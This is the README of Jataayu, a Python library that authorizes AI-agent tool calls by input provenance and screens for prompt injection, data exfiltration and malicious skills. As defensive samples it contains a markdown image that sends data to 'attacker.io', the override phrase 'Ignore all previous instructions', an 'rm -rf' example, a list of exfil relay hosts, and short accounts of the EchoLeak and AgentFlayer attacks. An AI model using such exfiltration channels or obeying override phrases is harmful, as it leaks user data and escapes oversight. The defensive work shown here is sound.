# 🦅 Jataayu

*In the Ramayana, Jataayu was the eagle who spotted Ravana abducting Sita. He didn't wait for a pattern to match. He saw the threat, judged the situation, and acted — alone, without hesitation. That's Jataayu.*

---

**The runtime authorization layer for tool-using AI agents. Gate the action, not the string.**

Jataayu decides — deterministically — whether an agent's *action* is allowed to run, from the
**harm of the effect × the provenance of the input × your capability policy**. An agent that read
an attacker-controlled web page can still summarize it; it just can't be tricked into running the
shell command, reading the secret, or POSTing your data that the attacker wanted. Around that core
it adds defense-in-depth screening (inbound injection, outbound privacy, exfiltration channels,
skill supply-chain) and replayable audit traces.

## What is deterministic, and what is a model

The distinction matters, so it is stated once, plainly:

| Component | Deterministic? | Uses a model? |
|---|---|---|
| **Effect boundary** — authorize the action from effect × provenance × capability policy | **Yes.** Pure function of its inputs; same inputs always give the same decision. | **No.** No model, no network call. |
| **Inbound fast path** — ~68 compiled regex patterns over normalized views | **Yes.** Same text always scores the same. | **No.** |
| **Inbound slow path** — *optional*, only for mid-confidence scores | No. | Yes — any OpenAI-compatible endpoint you point it at. |
| **[Jataayu prompt-injection detector](https://huggingface.co/srallaba/Jataayu.promptinjection.v0.1)** — *optional, separate artifact* | No. | Yes — it *is* a model (Qwen3.5-0.8B LoRA). |

**The guarantee is the deterministic part.** The effect boundary decides whether an action runs;
it does not ask a model, and it does not depend on any detector firing. The detectors are a
pre-filter and a taint source.

**The published SLM is not a dependency of this package.** `jataayu` never imports or calls it.
It is a separate model you may serve yourself and point the slow path at, exactly like any other
OpenAI-compatible endpoint. Install the package and the boundary works with no model at all.

## Why "gate the action, not the string"

Most agent-security tooling tries to *detect the attack text*. That's a losing arms race: an
adaptive attacker just rewrites the string until the classifier misses. Jataayu's thesis — the one
the 2026 standards (OWASP Agentic Top 10, NIST) converged on — is that the durable boundary is the
**action**, judged by where the influencing input *came from*:

- **What the agent DOES is the real guarantee.** Untrusted-derived input driving a shell command,
  a secret read, or a network write is denied or held for approval — *regardless of whether any
  detector flagged the text*. This is deterministic (no LLM) and is Jataayu's core.
- **What comes IN** (defense-in-depth). Injection rides in through the first message, a poisoned
  tool result, or something recalled from memory. Jataayu screens all of these — as a cheap
  pre-filter and taint source, explicitly *not* as the thing you rely on.
- **What goes OUT.** Private context can leak when the agent replies in a group chat or comments on
  an issue — most often through an exfiltration *channel* (a data-carrying URL / auto-fetched image),
  not prose. Jataayu catches the channel, not just the text.

## What it is / what it isn't

- ✅ **Is:** a deterministic action-authorization primitive + provenance/taint tracking + audit trace
  for tool-using agents. The effect boundary is the piece to build on.
- ✅ **Is:** defense-in-depth screening (inbound / outbound / egress / skill vetting) layered on top.
- ⚠️ **Is not:** a best-in-class prompt-injection *classifier*. The regex tier is a pre-filter,
  deliberately the weakest layer; as a standalone general detector its recall is modest (see
  [Detection performance](#detection-performance)). Don't deploy it *as* your only defense — that's
  the whole point of moving the guarantee to the action.

---

## Status

**v0.3.1 — alpha.** Not yet on PyPI. Install from GitHub (see below). API may still shift before 1.0.
See [CHANGELOG.md](CHANGELOG.md) for what landed in each release.
Contributions welcome — see [CONTRIBUTING.md](CONTRIBUTING.md); security reports go to [SECURITY.md](SECURITY.md).

---

## Install

```bash
# Core (effect boundary + regex pre-filter, no LLM deps)
pip install git+https://github.com/saikrishnarallabandi/jataayu.git

# With cloud LLM backends (OpenAI + Anthropic) for the optional slow path
pip install "jataayu[llm] @ git+https://github.com/saikrishnarallabandi/jataayu.git"

# With Ollama (local, free slow path)
pip install "jataayu[ollama] @ git+https://github.com/saikrishnarallabandi/jataayu.git"

# To run the MCP gateway proxy (needs aiohttp)
pip install "jataayu[gateway] @ git+https://github.com/saikrishnarallabandi/jataayu.git"
```

Requires Python ≥ 3.10. The only hard dependencies are `requests` and `pyyaml` (policy files);
LLM backends and the gateway's `aiohttp` are optional extras.

---

## Quick Start

### 1. Authorize the action (the core — start here)

Decide by the *harm of the effect* × the *provenance of the input*, deterministically (no LLM):

```python
from jataayu import jataayu_authorize_action, SecurityError

decision = jataayu_authorize_action(
    "shell.exec",
    {"cmd": "rm -rf /tmp/cache"},
    untrusted=True,   # these params were influenced by untrusted inbound content
)
# {tool_name: 'shell.exec', effect_class: 'shell', provenance: 'untrusted',
#  decision: 'deny', reason: 'untrusted-derived input may not reach a shell effect', ...}
assert decision["decision"] == "deny"   # rm -rf from untrusted input never runs
if decision["decision"] == "deny":
    raise SecurityError(decision["reason"])
```

Untrusted-derived input into a **shell / code-eval / secret-read** effect is denied; into
**network / file-write / memory-write** it needs human approval; everything else is allowed.

Tool names are matched by effect *family*, not by exact string — the common spellings resolve to
the same effect, so a shell call denies whether it arrives as `bash`, `shell.exec`, `os.system`,
`run_shell_command`, `subprocess.run`, or `subprocess.Popen`:

| Effect | Decision on untrusted input | Recognized name forms (exact + namespaced / snake_case / camelCase) |
|--------|-----------------------------|----------------------------------------------------------------------|
| `shell`       | **deny** | `bash`, `sh`, `shell.exec`, `os.system`, `run_shell_command`, `subprocess.run`, `subprocess.Popen`, `terminal`, `powershell` |
| `code_eval`   | **deny** | `eval`, `exec`, `python.exec`, `code.run`, `python_eval`, `js_eval`, `code_interpreter` |
| `secret_read` | **deny** | `read_env`, `get_secret`, `vault.read`, `secrets.get`, `read_credentials`, `env.get` |
| `network`     | **needs_approval** | `fetch`, `http.post`, `curl`, `webhook.trigger`, `send_email`, `send_channel_message`, `transfer_funds` |
| `file_write`  | **needs_approval** | `write_file`, `fs.write`, `file.delete`, `append_file`, `overwrite_file` |
| `memory_write`| **needs_approval** | `memory_write`, `save_memory`, `store_memory`, `kv_set` |
| `read`        | allow | `read_file`, `get_*`, `list_*`, `search_*`, `recall` |

The effect is read off the **verb** (leading, or trailing after a namespace), not off any token
anywhere in the name, so `run_shell_command` is a shell effect while `list_shell_history` stays a
read. A name matching no family at all falls back to `read`, as before — classification can only
move a name into a *more* restrictive class, never a less restrictive one.

For enforced execution, use the `PREVIEW → COMMIT` object API — the `commit_token` binds the exact
request, so mutating the action after authorization is rejected:

```python
from jataayu import EffectBoundary, Value, Provenance

eb = EffectBoundary()
preview = eb.preview(
    "file.write",
    {"path": "notes.md", "text": text},
    values=[Value(text, Provenance.TRUSTED, source="user")],
)
if preview.approved:
    eb.commit(preview, {"path": "notes.md", "text": text}, lambda: write_file("notes.md", text))
# commit() raises CommitRejected if the preview wasn't ALLOW or the params changed
```

Injected content can also be handed to the agent as an **opaque handle** with a bounded summary, so
an exfiltration attempt only ever holds a handle, not the raw secret (read-boundary confinement).

### 2. Screen what comes in (defense-in-depth)

Injection rides in on the first message, on tool results, and on whatever the agent recalled from
memory. Same engine, right surface — treat this as a taint source feeding the effect boundary, not
as your guarantee:

```python
from jataayu import (
    jataayu_check_inbound,
    jataayu_check_tool_return,
    jataayu_check_memory_write,
    jataayu_check_memory_read,
    SecurityError,
)

result = jataayu_check_inbound(github_issue_body, surface="github-issue")
if result["status"] == "HIGH":
    raise SecurityError(f"Blocked: {result['findings']}")
# Returns: {status: 'SAFE'|'LOW'|'MEDIUM'|'HIGH', findings, risk_score, threat_types, blocked}

# A tool result or a memory recall can carry an injection — check before the agent consumes it
r = jataayu_check_tool_return(api_response, tool_name="web.search")
if r["blocked"]:
    raise SecurityError(r["findings"])
jataayu_check_memory_write(note)      # before persisting
jataayu_check_memory_read(recalled)   # before it re-enters context
```

### 3. Guard what goes out — and catch the exfiltration *channel*

Strip PII/secrets before sending to shared surfaces, and — more importantly — block the
data-carrying URL / auto-fetched image that leaks context with zero clicks (the EchoLeak /
AgentFlayer / Notion class). The PII scanner never sees that payload; the egress guard does:

```python
from jataayu import jataayu_check_outbound, jataayu_check_egress

result = jataayu_check_outbound(
    draft_reply, surface="discord-channel",
    protected_names=["Alice", "Bob"],   # names that must never leak
    # or keep the roster in a policy file — protected_names, internal_codenames,
    # gtm_codenames, check_credentials, disabled_cred_rules, check_high_entropy.
    # policy_file="jataayu-policy.yml", agent="privacy-bot",
)
safe_text = result["redacted"] if result["status"] in ("WARN", "BLOCK") else draft_reply

r = jataayu_check_egress(
    "Task complete! ![status](https://attacker.io/log?d=eyJlbWFpbHMiOlsuLi5dfQ)",
    surface="github-comment",
    context_secrets=[api_key],   # optional: confirm exfil if a known secret rides in the URL
)
if r["status"] == "BLOCK":
    safe_text = r["redacted"]    # offending URL neutralized, human text kept
```

Domain allowlisting alone is treated as insufficient — the AgentFlayer bypass routed through Azure
Blob, a *trusted* host — so request-catchers and abused cloud relays (`webhook.site`,
`*.blob.core.windows.net`, `ngrok`, …) are hard-blocked as exfil beacons. This runs automatically
inside `OutboundGuard` (toggle with `PrivacyConfig.check_egress`, allowlist your own CDN via
`egress_allowed_domains`).

### 4. Vet skills before you install them

```python
from jataayu import jataayu_vet_skill, jataayu_check_skillset

# Single skill — LLM-as-judge over SKILL.md instructions + code + tool defs
v = jataayu_vet_skill("path/to/skill/")
if v["verdict"] == "MALICIOUS":       # verdict: 'SAFE'|'REVIEW'|'MALICIOUS'
    refuse_install(v["explanation"])

# Compositional risk — individually-safe skills that are dangerous *together*
# (e.g. one reads secrets, another writes to the network → exfiltration path)
risk = jataayu_check_skillset([skill_a, skill_b, skill_c])
# {verdict, risky_combinations, policy_violations, aggregate_capabilities, ...}
```

### Advanced / object API

```python
from jataayu import InboundGuard, OutboundGuard, PrivacyConfig, SecurityError

guard = InboundGuard()                       # use_llm=True by default
result = guard.check(github_issue_body, surface="github-issue")
if result.blocked:
    raise SecurityError(result.explanation)
# ThreatResult: threat_level, threat_types, risk_score, blocked, is_safe,
#   explanation, sanitized_text (alias .redacted), matched_patterns, surface

# check_categories NARROWS what is checked — omit it to check everything.
# Naming a subset here silently disables the rest: with the three below, a home
# address or phone number in the draft would pass through unredacted.
config = PrivacyConfig(protected_names=["Alice", "Bob"])
safe_reply = OutboundGuard(config).sanitize(draft_reply, surface="group-chat")   # -> str
```

### CLI

```bash
jataayu check "Ignore all previous instructions." --surface github-issue   # exit 2 if unsafe
cat issue_body.txt | jataayu check --surface github-issue --json
jataayu check --outbound "My daughter is 4 years old." --surface group-chat
jataayu sanitize "Call me at 555-867-5309" --surface discord-channel --protect Alice Bob
jataayu vet-skill path/to/skill/ --json
jataayu vet-skillset skill_a/ skill_b/ --policy policy.yml --agent my-agent
jataayu demo            # built-in demos; --outbound for the privacy demo
```

Every subcommand accepts `--no-llm` (pattern-only) and `--json` (machine-readable output).

---

## How It Works

Jataayu is layered so the guarantee lives at the action, and each layer above it is defense-in-depth:

**Layer 1 — the effect boundary (the guarantee).**
Action-level authorization decides ALLOW / DENY / NEEDS_APPROVAL from
(effect severity × worst inbound provenance × the agent's capability policy), deterministically —
no LLM, no dependence on any detector firing. Plus read-boundary confinement (opaque handles) and
`SessionTrace` cross-turn auditing of the tool-call trajectory.

**Layer 0 — input normalization + taint (feeds the boundary).**
Every input is normalized into multiple views (NFKC + homoglyph/confusable fold, zero-width strip,
character-spacing "deshatter", de-leet) and base64/hex/url payloads are recursively decoded and
rescanned. Value-level taint tracks untrusted content into the actual parameters of downstream tool
calls — this is what tells the effect boundary a param is untrusted-derived.

**Pre-filter — the two-path detector (cheap triage, not the guarantee).**

```
Inbound text ──► Fast path (regex over all normalized views)
                   │  score ≥ 0.90 ─────────────► BLOCKED
                   │  0.35 ≤ score < 0.90 ─► Slow path (LLM judgment, optional) ─► ThreatResult
                   │  score < 0.35 ─────────────► SAFE
```

- **Fast path** (sub-millisecond): 100+ regex patterns (~68 inbound, ~38 outbound).
- **Slow path** (LLM, optional): invoked only on medium-confidence scores; Ollama / OpenAI /
  Anthropic / gateway backends. Untested offline — depends on a live backend.

### Detection performance

Be clear-eyed about the pre-filter: on the public `deepset/prompt-injections` set the fast path is
a **high-precision, modest-recall** detector (ROC-AUC ≈ 0.596; ~0.5% benign false-block) — good for
cheap triage, *not* a complete defense. Its strongest measured win is narrow: input normalization
drops **space-out and leetspeak** evasion from ~0.97/0.92 success to 0.00 on a synthetic set, at
unchanged precision. This is exactly why the guarantee lives at the effect boundary, not here. Full
reproducible harness and saved results in [`benchmarks/`](benchmarks/).

#### The trained detector (optional, separate from the regex tier)

Above the regex pre-filter we also ship a small **fine-tuned detector** — a LoRA adapter on
Qwen3.5-0.8B that emits a single decision token read as a continuous `P(INJECTION)`.

- **Model:** [`srallaba/Jataayu.promptinjection.v0.1`](https://huggingface.co/srallaba/Jataayu.promptinjection.v0.1)
- **Try it:** [live demo Space](https://huggingface.co/spaces/srallaba/Jataayu-promptinjection-demo)
- **Training data & licensing:** every source MIT / Apache-2.0 / generated in-house; see the model card

Measured on a frozen 4,101-row held-out suite (6 injection datasets + NotInject over-defense),
with **zero overlap** between training data and the suite:

| metric | value |
|---|---|
| mean Recall@1%FPR (6 sets) | **0.828** |
| NotInject over-defense acc | 0.968 (11 FP) |
| counterfactual paired accuracy (400 pairs) | **0.778** |
| — authority-framed family | 0.938 |

The counterfactual number is the one we care about most: it is the only metric here that
penalizes *both* the "trigger word ⇒ attack" shortcut and over-defense with a single figure.
Selecting on recall alone actively rewards that shortcut.

Result files backing every number above: [`training/injection_adapter/eval/results/`](training/injection_adapter/eval/results/).

**Known limitation, stated up front:** the model over-flags benign text that refers to its own
instructions ("please ignore the typos in my last message") — 18 of 40 such held-out rows score
≥ 0.9999, tied with real attacks, so **no threshold separates them**. The base model does not
have this failure; fine-tuning introduces it. Do not use the 0.5 default cutoff — calibrate on
your own benign traffic. Full numbers and caveats on the model card.

---

## Surface Profiles

Jataayu grades a threat by *where the action takes effect*, not just the text. A shell command in a
GitHub issue is suspicious; in a coding task it's expected. Each surface sets a trust level, whether
inbound/outbound strict checks run, and a risk multiplier.

| Surface | Trust | Inbound strict | Outbound strict | ×risk | Notes |
|---|---|---|---|---|---|
| `github-issue` | 🔴 low | ✅ | ❌ | 1.2 | Clinejection attack surface |
| `github-pr` | 🔴 low | ✅ | ❌ | 1.2 | Code & description attacks |
| `github-comment` | 🔴 low | ✅ | ✅ | 1.15 | Public, agent often replies |
| `web-content` / `web-page` | 🔴 low | ✅ | ❌ | 1.1 | Invisible prompt injections |
| `tool-return` | 🔴 low | ✅ | ❌ | 1.15 | Poisoned tool output |
| `memory-write` | 🔴 low | ✅ | ❌ | 1.1 | Memory poisoning (in) |
| `memory-read` | 🔴 low | ✅ | ❌ | 1.1 | Memory poisoning (recall) |
| `skill-metadata` | 🔴 low | ✅ | ❌ | 1.15 | Install-time skill vetting |
| `email` | 🟡 medium | ✅ | ✅ | 1.15 | Phishing + data exfil |
| `whatsapp` | 🟡 medium | ❌ | ✅ | 1.1 | Group privacy critical |
| `telegram-group` | 🟡 medium | ❌ | ✅ | 1.1 | Group privacy critical |
| `discord-channel` | 🟡 medium | ❌ | ✅ | 1.0 | Public community |
| `discord-group` | 🟡 medium | ❌ | ✅ | 1.1 | Semi-public group DM |
| `group-chat` | 🟡 medium | ❌ | ✅ | 1.0 | Generic group surface |
| `unknown` | 🟡 medium | ✅ | ✅ | 1.0 | Default — check everything |
| `public` | 🔴 low | ✅ | ✅ | 1.1 | Anything world-readable |
| `direct-message` | 🟢 high | ❌ | ❌ | 0.8 | Private, trusted |
| `coding-task` | 🟡 medium | ❌ | ❌ | 0.7 | Shell commands expected |
| `internal` | 🟢 high | ❌ | ❌ | 0.5 | Agent-to-agent trusted |

---

## LLM Configuration

The optional slow path and skill vetting can use any of four backends, selected by env var:

```bash
export JATAAYU_LLM_BACKEND=ollama       # local, free — default
export JATAAYU_LLM_MODEL=llama3

export JATAAYU_LLM_BACKEND=openai
export JATAAYU_LLM_API_KEY=sk-...
export JATAAYU_LLM_MODEL=gpt-4o-mini

export JATAAYU_LLM_BACKEND=anthropic
export JATAAYU_LLM_API_KEY=sk-ant-...
export JATAAYU_LLM_MODEL=claude-haiku-4-5-20251001

export JATAAYU_LLM_BACKEND=gateway     # assistant gateway (OpenAI-compatible)
export JATAAYU_GATEWAY_BASE_URL=https://localhost:18789   # host root; the library appends
                                                          # /v1/chat/completions. A trailing /v1
                                                          # is accepted and normalized away.
export JATAAYU_GATEWAY_TOKEN=...
# TLS is verified by default. For a self-signed localhost gateway only, opt out explicitly:
# export JATAAYU_GATEWAY_INSECURE=true
```

Pattern-only mode needs no LLM and no API key — pass `use_llm=False` (or `--no-llm` on the CLI).

---

## For AI Agents

See the Quick Start above for how to wire Jataayu into an agent's action-authorization, inbound,
tool-return, and memory paths.

---

## Where Jataayu sits in the standards

The 2026 agent-security frameworks (OWASP's dedicated *Top 10 for Agentic Applications*, Dec 2025;
NIST's AI Agent Standards Initiative) converged on the same thesis Jataayu is built around: the
durable boundary is the **action**, gated by input **provenance** — not the attack string, which is
the weakest tier against an adaptive attacker. Jataayu's guarantees map onto the OWASP Agentic risks
so you can slot it into the framework your org already uses:

| OWASP Agentic risk (2026) | Jataayu mechanism |
|---|---|
| Tool misuse & unexpected code execution | **Effect boundary** — untrusted-derived input into shell / code-eval / secret-read is denied deterministically |
| Identity & privilege abuse | Provenance × effect-severity authorization + capability allow/forbid policy (`config/policy.py`) |
| Goal / instruction hijack (prompt injection) | `InboundGuard` (normalize → regex → LLM) across every input surface, incl. `tool-return` / `memory-*` |
| Agentic supply-chain (malicious tools/skills) | `jataayu_vet_skill` (LLM-judge) + `jataayu_check_skillset` (compositional + trust-transfer) |
| Memory & context poisoning | `memory-read` / `memory-write` surfaces + `SessionTrace` cross-turn sleeper-poisoning detection |
| Data exfiltration / excessive autonomy | Outbound privacy guard **+ egress-channel guard** (auto-fetched-image / data-carrying-URL class) |
| Cascading / progressive compromise | `SessionTrace` escalating-trajectory + cross-turn exfil-chain auditing |

The moat is the effect boundary and the execution-aware layers — the regex catalog is a cheap
pre-filter, deliberately the *weakest* tier. This positioning is drawn from a 2026 literature scan of agent-security work, kept with the
project's research notes.

## License

Apache-2.0 — see [LICENSE](LICENSE). Same license as the published adapter and the Qwen3.5 base model.

---

*Named for [Jataayu](https://en.wikipedia.org/wiki/Jatayu), the noble eagle of the Ramayana who fought alone to protect the innocent.*
